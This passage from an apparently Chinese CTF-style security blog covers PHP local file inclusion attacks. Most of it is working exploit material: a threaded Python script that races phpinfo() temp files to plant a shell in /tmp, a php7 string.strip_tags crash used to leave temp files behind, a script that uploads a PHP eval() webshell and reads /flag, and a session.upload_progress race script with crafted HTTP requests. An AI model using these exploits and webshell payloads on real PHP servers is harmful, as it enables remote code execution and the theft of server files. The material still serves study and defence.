class=\"line\"><span class=\"string\">User-Agent: Mozilla/4.0\\r</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: Keep-Alive\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (REQ1, TAG, LFIREQ)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">phpInfoLFI</span>(<span class=\"params\">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s2.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    d = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(d) &lt; offset:</span><br><span class=\"line\">        d += s.recv(offset)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        i = d.index(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">        fn = d[i + <span class=\"number\">17</span>:i + <span class=\"number\">44</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    s2.send(lfireq % (fn, host))</span><br><span class=\"line\">    d = s2.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    s2.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> d.find(tag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">counter = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadWorker</span>(threading.Thread):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, e, l, m, *args</span>):</span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self.event = e</span><br><span class=\"line\">        self.lock = l</span><br><span class=\"line\">        self.maxattempts = m</span><br><span class=\"line\">        self.args = args</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">global</span> counter</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.event.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">with</span> self.lock:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= self.maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                counter += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                x = phpInfoLFI(*self.args)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> self.event.is_set():</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> x:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class=\"line\">                    self.event.<span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> socket.error:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getOffset</span>(<span class=\"params\">host, port, phpinforeq</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\"></span><br><span class=\"line\">    d = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        i = s.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">        d += i</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i == <span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\"># detect the final chunk</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.endswith(<span class=\"string\">&quot;0\\r\\n\\r\\n&quot;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    i = d.find(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i == -<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;found %s at %i&quot;</span> % (d[i:i + <span class=\"number\">10</span>], i)</span><br><span class=\"line\">    <span class=\"comment\"># padded up a bit</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> i + <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;LFI With PHPInfo()&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;-=&quot;</span> * <span class=\"number\">30</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        host = socket.gethostbyname(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class=\"number\">1</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    port = <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        port = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class=\"number\">2</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    poolsz = <span class=\"number\">10</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        poolsz = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">3</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class=\"number\">3</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Getting initial offset...&quot;</span>,</span><br><span class=\"line\">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class=\"line\">    offset = getOffset(host, port, reqphp)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    maxattempts = <span class=\"number\">1000</span></span><br><span class=\"line\">    e = threading.Event()</span><br><span class=\"line\">    l = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    tp = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, poolsz):</span><br><span class=\"line\">        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> e.wait(<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> l:</span><br><span class=\"line\">                sys.stdout.write(<span class=\"string\">&quot;\\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class=\"line\">                sys.stdout.flush()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&quot;Woot!  \\m/&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&quot;:(&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nTelling threads to shutdown...&quot;</span></span><br><span class=\"line\">        e.<span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"lfiphp7-collapse\"><a class=\"markdownIt-Anchor\" href=\"#lfiphp7-collapse\">#</a> LFI+php7 collapse</h2>\n<p>php 7.0-7.1.19</p>\n<p>当不存在 phpinfo 时，可以利用 php7 的特性</p>\n<p><code>http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</code>  导致 php 崩溃，临时文件遗留了下来</p>\n<p>在上传时抓包，使用以上 payload 进行崩溃</p>\n<p>接下来需要找到刚刚的临时文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a = @$_GET[&#x27;dir&#x27;];</span><br><span class=\"line\">if(!$a)&#123;</span><br><span class=\"line\">$a = &#x27;/tmp&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>\n<p>然后写 shell 包含随便搞</p>\n<p>两种崩溃方法：</p>\n<p>抓包时修改</p>\n<p>先写个文件上传页面，上传时抓包，修改 url 和文件内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /upload_file.php?file=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Content-Length: 290</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\">sec-ch-ua-mobile: ?0</span><br><span class=\"line\">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://127.0.0.1:18888</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Sec-Fetch-Site: same-origin</span><br><span class=\"line\">Sec-Fetch-Mode: navigate</span><br><span class=\"line\">Sec-Fetch-User: ?1</span><br><span class=\"line\">Sec-Fetch-Dest: document</span><br><span class=\"line\">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=9pji5c42u9migge868i8u083r7; ZDEDebuggerPresent=php,phtml,php3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提交</span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC--</span><br></pre></td></tr></table></figure>\n<p>写 python 包崩溃</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from io import BytesIO</span><br><span class=\"line\">import re</span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  &#x27;file&#x27;: BytesIO(&#x27;&lt;?php eval($_REQUEST[sky]);&#x27;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = &#x27;http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class=\"line\">try:</span><br><span class=\"line\">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class=\"line\">except:</span><br><span class=\"line\">url = &#x27;http://ip/dir.php&#x27;</span><br><span class=\"line\">r = requests.get(url)</span><br><span class=\"line\">data = re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0)</span><br><span class=\"line\">url = &quot;http://ip/index.php?file=/tmp/&quot;+data</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">&#x27;sky&#x27;:&quot;readfile(&#x27;/flag&#x27;);&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r =  requests.post(url=url,data=data)</span><br><span class=\"line\">print r.content</span><br></pre></td></tr></table></figure>\n<h2 id=\"docker中文件包含\"><a class=\"markdownIt-Anchor\" href=\"#docker中文件包含\">#</a> docker 中文件包含</h2>\n<p>1. 包含日志文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">access.log -&gt; /dev/stdout</span><br><span class=\"line\">error.log -&gt; /dev/stderr</span><br></pre></td></tr></table></figure>\n<p>此时日志被重定向到标准输出中，不能包含</p>\n<p>此时包含这些 Web 日志会出现 <code>include(/dev/pts/0): failed to open stream: Permission denied</code>  的错误，因为 PHP 没有权限包含设备文件：</p>\n<p>远程包含因为默认不开启，所以我们也不作为一个候选项，想要 getshell 还是需要找到一个可以控制内容的文件进行包含。</p>\n<p>2.phpinfo 文件包含</p>\n<p>同样 post 一个大文件，然后利用时间竞争</p>\n<p>脚本和之前的脚本类似，但更改了切片的位置</p>\n<p><code>fn = d[i+17:i+31]</code></p>\n<p>3.Windows 中通配符</p>\n<p>在临时文件包含中，我们详细讲过通配符</p>\n<ul>\n<li>DOS_STAR：即  <code>&lt;</code> ，匹配 0 个以上的字符</li>\n<li>DOS_QM：即 <code>&gt;</code> ，匹配 1 个字符</li>\n<li>DOS_DOT：即 <code>&quot;</code> ，匹配点号</li>\n</ul>\n<p>有了通配符，我们就可以匹配临时文件，并修改其内容</p>\n<p>一般我们会用 fputs 和 fopen 写到临时文件中，这样临时文件即使删除，我们可以将我们的马写到其他的目录中</p>\n<p>4.session.upload_progress</p>\n<p>php version &gt; 7</p>\n<p>session.auto_start 顾名思义，如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start ()。但默认情况下，也是通常情况下，这个选项都是关闭的。</p>\n<p>session.upload_progress 最初是 PHP 为上传进度条设计的一个功能，在上传文件较大的情况下，PHP 将进行流式上传，并将进度信息放在 Session 中（包含用户可控的值），即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。</p>\n<p>PHP 在开启了 <code>session.upload_progress.enable</code>  后（在包括 Docker 的大部分环境下默认是开启的），将会把用户上传文件的信息保存在 Session 中，而 PHP 的 Session 默认是保存在文件里的。</p>\n<p>利用条件：</p>\n<ul>\n<li>目标环境开启了 <code>session.upload_progress.enable</code>  选项</li>\n<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是 <code>PHP_SESSION_UPLOAD_PROGRESS</code>  的字段</li>\n<li>请求的 Cookie 中包含 Session ID</li>\n</ul>\n<p>构造如下上传包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">\t&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo(); ?&gt;&quot; /&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>上传抓包时设置 cookie: PHPSESSID=hahaha</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /web10.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Content-Length: 426</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\">sec-ch-ua-mobile: ?0</span><br><span class=\"line\">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://127.0.0.1:18888</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=2333333; ZDEDebuggerPresent=php,phtml,php3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">nishishabi</span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html PUBLIC </span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提交</span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB--</span><br></pre></td></tr></table></figure>\n<p>上传后我们可以控制文件名，就是我们的 PHPSESSID，但临时文件内容是空的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102153200577.png\" alt=\"image-20221102153200577\"></p>\n<p>可见，我在上传文件的同时，POST 了一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，其值为 bbbbbbb。（PHP_SESSION_UPLOAD_PROGRESS 是在 php.ini 里定义的 session.upload_progress.name）只要上传包里带上这个键，PHP 就会自动启用 Session，又因为我在 Cookie 中设置了 PHPSESSID=aaaaaaa，所以 Session 文件将会自动创建。</p>\n<p>但它的大小为什么是 0 呢？因为上传结束后，这个 Session 将会被自动清除（由 session.upload_progress.cleanup 定义），我们只需要条件竞争，赶在文件被清除前利用即可。</p>\n<p>通过竞争实现删除之前包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import io</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">sessid = &#x27;23333&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def t1(session):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class=\"line\">        response = session.post(</span><br><span class=\"line\">            &#x27;http://127.0.0.1:18888/file_upload.php&#x27;,</span><br><span class=\"line\">            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?=phpinfo()?&gt;&#x27;&#125;,</span><br><span class=\"line\">            files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class=\"line\">            cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def t2(session):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        response = session.get(f&#x27;http://192.168.1.7/xss_location/include/session_upload.php?file=C:/windows/sess_&#123;sessid&#125;&#x27;)</span><br><span class=\"line\">        print(response.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">with requests.session() as session:</span><br><span class=\"line\">    t1 = threading.Thread(target=t1, args=(session,))</span><br><span class=\"line\">    t1.daemon = True</span><br><span class=\"line\">    t1.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    t2(session)</span><br></pre></td></tr></table></figure>\n<p><code>&lt;?=phpinfo();?&gt;</code>   可以改为写文件，在自定义的路径下写文件，然后在包含，这样无需解决路径和文件名的问题</p>\n<p>5. 通过 string.strip-tag 导致 php 崩溃</p>\n<p>在 docker 中也是可以用的，具体看上面</p>\n<p>6.pearcmd.php</p>\n<p>pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 <code>--with-pear</code>  才会安装。</p>\n<p>不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 <code>/usr/local/lib/php</code> 。</p>\n<p>Docker 环境下的 PHP 会开启 <code>register_argc_argv</code>  这个配置。当开启了这个选项，用户的输入将会被赋予给 <code>$argc</code> 、 <code>$argv</code> 、 <code>$_SERVER['argv']</code>  几个变量。</p>\n<p>这意味着，HTTP 数据包中的 query-string 会被作为 argv 的值</p>\n<p><code>[PHP 7.3.33 - phpinfo()](http://127.0.0.1:18888/phpinfo.php?uuuuuuu)</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102164711562.png\" alt=\"image-20221102164711562\"></p>\n<p>如果 query-string 中不包含没有编码的 <code>=</code> ，且请求是 GET 或 HEAD，则 query-string 需要被作为命令行参数。</p>\n<p>PHP 现在仍然没有严格按照 RFC 来处理，即使我们传入的 query-string 